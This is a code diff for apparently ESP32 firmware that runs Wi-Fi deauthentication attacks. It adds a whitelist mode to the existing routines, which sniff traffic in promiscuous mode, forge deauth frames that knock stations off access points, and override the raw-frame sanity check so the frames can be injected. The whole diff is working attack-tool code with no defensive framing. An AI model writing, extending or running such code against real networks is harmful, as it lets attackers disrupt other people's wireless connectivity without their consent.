@@ -7,6 +7,18 @@
 deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_SINGLE;
 int eliminated_stations;
+int deauth_type_whitelist = 0;
+
+extern whitelist_t whitelist;
+
+bool is_in_whitelist(uint8_t *bssid) {
+    for (int i = 0; i < whitelist.count; i++) {
+        if (whitelist.entries[i].active && memcmp(whitelist.entries[i].bssid, bssid, 6) == 0) {
+            return true;
+        }
+    }
+    return false;
+}
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
@@ -31,6 +43,11 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     } else return;
   } else {
     if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
+      
+      if (deauth_type_whitelist && is_in_whitelist((uint8_t*)mac_header->dest)) {
+        return;
+      }
+      
       memcpy(deauth_frame.station, mac_header->src, 6);
       memcpy(deauth_frame.access_point, mac_header->dest, 6);
       memcpy(deauth_frame.sender, mac_header->dest, 6);
@@ -55,7 +72,11 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
     memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
     memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
   } else {
-    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
+    if (deauth_type_whitelist) {
+      DEBUG_PRINTLN("Starting Whitelist-Mode Deauth-Attack!");
+    } else {
+      DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
+    }
     WiFi.softAPdisconnect();
     WiFi.mode(WIFI_MODE_STA);
   }
@@ -67,5 +88,6 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
 
 void stop_deauth() {
   DEBUG_PRINTLN("Stopping Deauth-Attack..");
+  deauth_type_whitelist = 0;
   esp_wifi_set_promiscuous(false);
 }
